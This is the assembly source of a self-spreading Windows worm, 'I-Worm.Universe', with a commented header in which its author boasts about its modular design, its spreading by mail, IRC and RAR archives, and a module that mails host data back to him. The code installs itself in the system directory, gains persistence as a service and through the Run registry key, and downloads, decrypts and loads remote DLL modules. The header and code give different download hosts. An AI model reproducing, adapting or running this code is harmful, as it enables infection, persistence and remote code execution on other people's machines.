;                          ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;                          ³    I-Worm.Universe    ³
;                          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;                             ³  by Benny/29A  ³
;                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
;
;
;When I finished my last I-Worm.XTC I had my head full of new ideaz. My most
;favourite idea was the fully modular/complementar worm, where the primary part
;of the worm would not contain any action routine, it should only download all
;available worm modulez/plug-inz from Internet, which should do the rest (very
;similar idea was described at 29A#4 in my article about InterProcess
;Communication) - one part of worm means nothing, but all parts together makes
;one functional worm.
;I also wanted such modulez to be easily controlable/upgradable, that for case
;of easilly changing of worm behaviour. And that's already done.
;In the case the worm would become spreaded there's nothing easier than release
;new module/plug-in which will destroy all partz of the worm. Or another module
;which will use computer performance of infected machinez for instance for
;cracking passwordz etc... Abilitiez are limited only by my fantasy.
;The worm can be also used for "better" purposes than spreading itself. I can
;just remove spreading module, create some backdoor module and I have fully
;functional remote-administration program. The biggest advantage of such worm
;is variability...
;
;
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Technical details of modulez ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
;Each module is encrypted/compressed by "tElock" utility, like I-Worm.Energy
;and I-Worm.XTC. Primary module is in fact one EXE file containing standard
;icon of DLLz, all other modulez are heavilly encrypted DLLz (using RSA alike
;crypto algorithm). Everything is coded in assembler, ofcoz :-)
;
;Primary module:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;The algorithm of the main (primary) module is very easy. The idea was that
;this module should do only the most necessary thingz and the rest should be up
;to other onez... the algo goes here:
;
;1)	Module will copy itself to system directory under msvbvm60.exe name,
;	execute itself there and register itself as service process, algorithm
;	is similar to Energy and XTC.
;2)	Download the list of all available modulez from
;	http://shadowvx.com/benny/viruses/mod.txt.
;3)	Download all modulez from addresses specified in the list, decrypt them
;	(RSA algo) and save them to system directory under msvbvm6(a-z).dll
;	filenamez.
;4)	Load those DLLz to its address space. By windows API will be activated
;	all initialization routinez, which will execute the code inside modulez.
;5)	Wait random time, simulate fork and jump to 1) step, like Energy and
;	XTC.
;
;Module for mail spreading:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;This module will after activation search inside all *.*htm* filez in "Temporary
;Internet Files" for mail addresses and send there the main module. It will not
;send the main module stored in system directory, but the one stored inside
;itself. So if this module will contain newer version of main module, it will
;update itself on remote computer.
;
;Payload module:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;In dependency on system counter, it will redirect all URLs in MSIE to
;http://www.therainforestsite.com, such like I-Worm.XTC.
;And again, in dependency on system counter it will download bitmap from
;http://shadowvx.com/benny/viruses/universe.jpg, save it to system directory
;and set it as standard wallpaper. I like this one :-)
;And at last, in dependency on system counter it will display random garbage
;on the screen (in infinite loop) - in green & black colorz.
;
;Module for worm feedback:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;This module will send the feedback to my mail address at benny_29a@hushmail.com.
;Inside the mail message is stored the host name and IP address. When it will
;finish, it will modify registry as "already-sent" mark, so it won't disturb me
;with thousandz mailz from one machine :-)
;
;Module for mIRC spreading:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;This module will check if c:\mirc\mirc32.exe exists, and if so, it will create
;c:\mirc\script.ini containing script which will send the main module to all
;ppl present on IRC channel.
;
;Module for spreading inside RAR archivez:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;This module will infect all RAR archivez stored in standard Download directory
;of MSIE by adding SETUP.EXE respresenting the main module.
;
;
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Problemz with AVP ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

;Since I released this worm, second day AVP released its "funny" description. It
;informed that Universe has many bugz, however, I was able to find only ONE bug
;- when I tested it everything was Ok, but in last compilation I forgot to ZIP
;the main module - I corrected this bug in a minute and modified buggy module on
;internet. Funny thing is that they described only 5 modulez and they forgot to
;describe the last one :-) Well, its a big advantage of virusez/wormz with modular
;architecture. After hour or two, my website at www.hyperlink.cz was closed by
;provider. I wrote a mail to provider describing the situation that I DON'T spread
;viruses, that I haven't crossed any law or their rulez. I asked them if it's
;possible to close someone's website only becoz of one private software company
;that earns money by lieing to ppl's eyes. They were not able to reply me becoz
;AVP caused also closure of my mail address "benny_29a@hushmail.com". I sent
;mail to hushmail.com with similar very polite content and I still haven't
;recieved any mail from them. And it seemz I won't ever do. Funny, eh?
;Nowadayz my homepage should be placed at www.shadowvx.com and my old e-mail
;address "benny@post.cz" should also work. KasperPig showed his lameness again.
;
;
;ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Last notez ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
;While I was coding this worm, I had really fun... It was very nice to sit and
;watch my growing babe. I really wanted to publish it in 29A#5, but becoz of
;my problemz with inet connection and lack of time I was not able to finish it
;in december. However, I'm sure you don't mind :-)
;
;
;
;
;                                                  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;                                                  # Benny / 29A ÀÄ¿
;                                                  @ benny@post.cz ÀÄÄÄÄÄÄÄÄÄ¿
;(c) January, 2001                                 @ http://benny29a.cjb.net ³
;Czech Republic                                    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ



.386p
.model	flat

include	win32api.inc
include	useful.inc


invoke	macro	api					;macro for API callz
	extrn	api:PROC				;declare API
	call	api					;call it...
endm


.data
	signature	db	0,'[I-Worm.Universe] by Benny/29A',0
							;little signature ;-)
	ckey_start:
	include	key.inc					;rsa simple key
	ckey_end:

	ckeypp_start:
	include key_pp.inc				;rsa private/public key
	ckeypp_end:					;pair

	mod_buffer	db	1000h dup (?)		;buffer for list of modulez
	wormname	db	MAX_PATH dup (?)	;primary worm filename
	wormname2	db	MAX_PATH dup (?)	;secondary worm filename
	temppath	db	MAX_PATH dup (?)	;temporary buffer
	cProvider	dd	?			;handle of cryptographic provider
	cKey_pp		dd	?			;handle to priv/pub. key pair
	cKey		dd	?			;handle to simple key
	tmp		dd	?			;for misc. usage

.code							;worm code starts here
Start:	pushad
	@SEH_SetupFrame <jmp end_worm>			;setup SEH frame

	push	10000
	invoke	Sleep					;wait 10 secondz

	push	1
	invoke	SetErrorMode				;disable error messagez

	push	10h
	push	1
	push	0
	push	offset Universe
	push	offset cProvider			;delete previously used
	invoke	CryptAcquireContextA			;crypto record

	push	8
	push	1
	push	0
	push	offset Universe
	push	offset cProvider
	invoke	CryptAcquireContextA			;create new one
	dec	eax
	jne	end_worm

	push	offset cKey_pp
	push	0
	push	0
	push	ckeypp_end-ckeypp_start
	push	offset ckeypp_start
	push	[cProvider]				;import public/private
	invoke	CryptImportKey				;key pair
	dec	eax
	jne	end_worm				;quit if error

	push	offset cKey_pp
	push	1
	push	[cProvider]
	invoke	CryptGetUserKey				;get handle to that

	push	offset cKey
	push	0
	push	[cKey_pp]
	push	ckey_end-ckey_start
	push	offset ckey_start
	push	[cProvider]				;import simple key
	invoke	CryptImportKey
	dec	eax
	je	con_crypt				;quit if error

end_worm:
	@SEH_RemoveFrame				;remove SEH frame
	popad
	push	0
	invoke	ExitProcess				;and quit

con_crypt:
	push	MAX_PATH
	push	offset wormname2
	push	0
	invoke	GetModuleFileNameA			;get worm filename
	mov	[wormname2_size],eax			;save the size

	call	SVCRegister				;register as service
e_svc:							;process
	call	HideWorm				;create worm-service
	invoke	GetCommandLineA				;get ptr to command line
	mov	edi,eax					;to EDI
	xchg	eax,esi
l_gca:	lodsb
	test	al,al
	je	p_copy
	cmp	al,20h
	jne	l_gca					;skip from filename

l_par:	lodsb						;skip from parameterz 
	cmp	al,20h
	je	l_par
	test	al,al
	je	p_copy					;no parameterz

	dec	esi					;yep, parameter present,
	push	esi					;worm already copied,
	invoke	DeleteFileA				;delete the first copy

	call   DownloadModules				;download all modulez

	invoke	GetTickCount				;get random number
	xor	edx,edx
	mov	ecx,5*60000
	div	ecx					;normalize to 0..5 minutez

	push	edx
	invoke	Sleep					;wait random time long

p_copy:	call	CopyWorm				;copy the worm to another
	jmp	end_worm				;file in system directory


;this procedure can copy the worm file to system directory of Windows and
;execute it
CopyWorm	Proc
	mov	esi,edi
	mov	edi,offset wormname			;copy the filename to
	@copysz						;buffer

	mov	edi,offset temppath
	push	MAX_PATH
	push	edi
	invoke	GetSystemDirectoryA			;get system directory
	push	edi
	push	eax
	push	edi
	push	edi
	invoke	SetCurrentDirectoryA
	pop	edi
	pop	eax
	add	edi,eax

	mov	eax,'vsm\'
	stosd
	mov	eax,'6mvb'
	stosd
	mov	eax,'xe.0'
	stosd
	push	'e'
	pop	eax
	stosw						;create sysdir\msvbvm60.exe
	pop	edi					;filename

	mov	esi,offset wormname2
	push	0
	push	edi
	push	esi
	invoke	CopyFileA				;copy worm to sysdir

	push	edi
	push	esi
	mov	esi,edi
	@endsz
	dec	esi
	mov	edi,esi
	pop	esi
	mov	al,20h
	stosb
	@copysz
	pop	edi					;create the command line

	push	0
	push	edi
	invoke	WinExec					;and execute worm
	ret						;from system directory
CopyWorm	EndP


;this procedure can execute worm as service process
HideWorm	Proc
	push	000F0000h or 2
	push	0
	push	0
	invoke	OpenSCManagerA				;get handle to SCM
	test	eax,eax
	je	e_scm0
	xchg	eax,esi					;to ESI

	push	10000h
Universe = $+5
	@pushsz	'Universe'
	push	esi
	invoke	OpenServiceA
	xchg	eax,ecx
	jecxz	e_scm2

	push	ecx
	push	ecx
	invoke	DeleteService				;delete service
	invoke	CloseServiceHandle

e_scm2:	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	offset wormname2
	push	eax
	push	2
	push	10h
	push	000F0000h or 1 or 2 or 4 or 8 or 10h or 20h or 40h or 80h or 100h
	push	offset Universe
	push	dword ptr [esp]
	push	esi
	invoke	CreateServiceA				;and create it again
	test	eax,eax
	je	e_scm1

	push	eax
	invoke	CloseServiceHandle
e_scm1:	push	esi
	invoke	CloseServiceHandle			;close all opened handlez
	ret

e_scm0:	invoke	GetLastError				;get error code
	cmp	eax,78h					;if not compatibility
	jne	end_hide				;error then quit

	push	12345678h
wormname2_size = dword ptr $-4
	push	offset wormname2
	push	1
	push	offset Universe
run_key = $+5
	@pushsz	'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
	push	80000002h				;modify registry so
	invoke	SHSetValueA				;worm will be executed
							;every start of windows
	@pushsz	'Kernel32.dll'
	invoke	GetModuleHandleA			;get base address of K32
	xchg	eax,ecx
	jecxz	end_hide
	@pushsz	'RegisterServiceProcess'
	push	ecx
	invoke	GetProcAddress				;get ptr to API
	xchg	eax,ecx
	jecxz	end_hide
	push	1
	push	0
	call	ecx					;register as service
end_hide:						;process under Win9x
	ret
HideWorm	EndP


;register service process under WinNT/2k
SVCRegister	Proc
	call	_dt
	dd	offset Universe
	dd	offset service_start
	dd	0
	dd	0
_dt:	invoke	StartServiceCtrlDispatcherA		;make a connection with
	dec	eax					;SCM
	jne	e_svc					;error, continue...

	push	0
	invoke	ExitThread				;quit the thread

service_start:
	pushad
	@SEH_SetupFrame	<jmp end_worm>

	push	offset end_hide
	push	offset Universe
	invoke	RegisterServiceCtrlHandlerA		;register service
	test	eax,eax					;handler
	je	e_svc
	push	eax

	call	_ss
ss_:	dd	10h or 20h
	dd	4
	dd	0
	dd	0
	dd	0
	dd	0
	dd	0
_ss:	push	eax
	invoke	SetServiceStatus			;set the service status
	invoke	CloseServiceHandle			;close service handle
	jmp	e_svc					;and continue...
SVCRegister	EndP



DownloadModules	Proc
	pushad
	@SEH_SetupFrame	<jmp	end_dm>

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	offset Universe
	invoke	InternetOpenA				;create the inet handle
	test	eax,eax
	je	end_dm
	xchg	eax,ebx

	xor	eax,eax
	push	eax
	push	80000000h				;no cache
	push	eax
	push	eax
	@pushsz	'http://shadowvx.gov/benny/viruses/mod.txt'
	push	ebx
	invoke	InternetOpenUrlA			;open URL
	test	eax,eax
	je	err_dm1
	xchg	eax,ebp

	mov	esi,offset mod_buffer
	push	offset tmp
	push	1000h
	push	esi
	push	ebp
	invoke	InternetReadFile			;read the list file
	xchg	eax,ecx
	jecxz	err_dm2

	call	get_modules				;parse URLs from there

err_dm2:push	ebp
	invoke	InternetCloseHandle
err_dm1:push	ebx
	invoke	InternetCloseHandle			;close all inet handlez
end_dm:	@SEH_RemoveFrame
	popad
	ret

get_modules:
	push	esi
l_gm:	lodsb
	test	al,al
	je	_end_gm
	cmp	al,0Dh
	jne	l_gm
	mov	byte ptr [esi-1],0			;separate URL
l_gm2:	lodsb
	cmp	al,0Ah
	jne	l_gm2
	mov	ecx,esi
	pop	esi					;and download new module
	call	download_module				;from that URL
	inc	byte ptr [l_name]
	mov	esi,ecx
	jmp	get_modules
_end_gm:pop	eax
	ret

download_module:
	pushad
	xor	eax,eax
	push	eax
	push	80000000h				;no cache
	push	eax
	push	eax
	push	esi
	push	ebx
	invoke	InternetOpenUrlA			;open URL
	test	eax,eax
	je	err_dm00
	xchg	eax,edi

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	0
	push	FILE_SHARE_READ
	push	GENERIC_WRITE or GENERIC_READ
	call	@filen
lib_nam:db	'msvbvm6'				;name of module stored
l_name:	db	'a.dll',0				;on the disk
@filen:	invoke	CreateFileA				;create that file
	inc	eax
	je	err_dm11
	dec	eax
	mov	[hFile],eax

	cdq
	push	edx
	push	10008h
	push	edx
	push	PAGE_READWRITE
	push	edx
	push	eax
	invoke	CreateFileMappingA
	xchg	eax,ecx
	jecxz	err_dm22
	mov	[hMapFile],ecx

	xor	edx,edx
	push	edx
	push	edx
	push	edx
	push	FILE_MAP_WRITE
	push	ecx
	invoke	MapViewOfFile				;map it
	xchg	eax,ecx
	jecxz	err_dm33
	mov	[lpFile],ecx

	push	offset tmp
	push	10008h
	push	ecx
	push	edi
	invoke	InternetReadFile			;read the module
	xchg	eax,ecx
	jecxz	err_dm44

	call	@fsize
	dd	10008h
@fsize:	push	[lpFile]
	push	0
	push	1
	push	0
	push	[cKey]
	invoke	CryptDecrypt				;and decrypt that module

err_dm44:
	push	12345678h
lpFile = dword ptr $-4
	invoke	UnmapViewOfFile				;unmap file
err_dm33:
	push	12345678h
hMapFile = dword ptr $-4
	invoke	CloseHandle
err_dm22:
	push	12345678h
hFile = dword ptr $-4
	invoke	CloseHandle				;close file

	push	offset lib_nam				;by this call will be
	invoke	LoadLibraryA				;activated function
err_dm11:						;routine of module (DllMain)
	push	edi
	invoke	InternetCloseHandle			;close inet handle
err_dm00:
	popad
	ret

DownloadModules	EndP
end	Start						;end of worm code
